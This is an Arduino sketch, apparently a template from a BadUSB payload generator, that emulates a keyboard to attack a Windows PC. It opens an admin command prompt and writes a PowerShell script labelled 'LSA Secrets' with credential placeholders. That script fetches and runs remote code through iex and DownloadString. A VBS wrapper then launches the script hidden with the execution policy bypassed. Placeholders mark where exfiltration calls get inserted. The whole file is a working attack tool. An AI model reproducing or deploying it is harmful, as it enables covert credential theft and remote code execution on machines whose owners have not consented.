void setup()
{
  Keyboard.begin();
}
void loop(){

  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println(F("echo $pn = $env:COMPUTERNAME + \"  LSA Secrets\" > %temp%\\dl.ps1"));
  Keyboard.println(F("echo $user = \"INPUT1\" >> %temp%\\dl.ps1"));
  Keyboard.println(F("echo $pass = \"INPUT2\" >> %temp%\\dl.ps1"));
  Keyboard.println(F("echo $dev = \"INPUT3\" >> %temp%\\dl.ps1"));
  Keyboard.println(F("echo $wc = New-Object System.Net.WebClient >> %temp%\\dl.ps1"));
  Keyboard.println(F("echo $pv = iex $wc.DownloadString(\"INPUT4\") >> %temp%\\dl.ps1"));
  String fn = "dl";
  String fp;
  EXFILCALLS

  Keyboard.println(F("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dl.vbs"));
  Keyboard.println(F("echo arch = GetObject(\"winmgmts:root\\cimv2:Win32_Processor='cpu0'\").AddressWidth >> %temp%\\dl.vbs"));
  Keyboard.println(F("echo If arch = \"32\" then >> %temp%\\dl.vbs"));
  Keyboard.println(F("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dl.ps1\"),0,true >> %temp%\\dl.vbs"));
  Keyboard.println(F("echo elseif arch = \"64\" then >> %temp%\\dl.vbs"));
  Keyboard.println(F("echo oShell.Run(\"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -ep bypass -nologo -c %temp%\\dl.ps1\"),0,true >> %temp%\\dl.vbs"));
  Keyboard.println(F("echo end If >> %temp%\\dl.vbs"));
  delay(1000);
  Keyboard.println(F("wscript %temp%\\dl.vbs"));
  delay(3000);
  Keyboard.println(F("exit"));
  while(true);
}

DEFS
EXFILDEFS
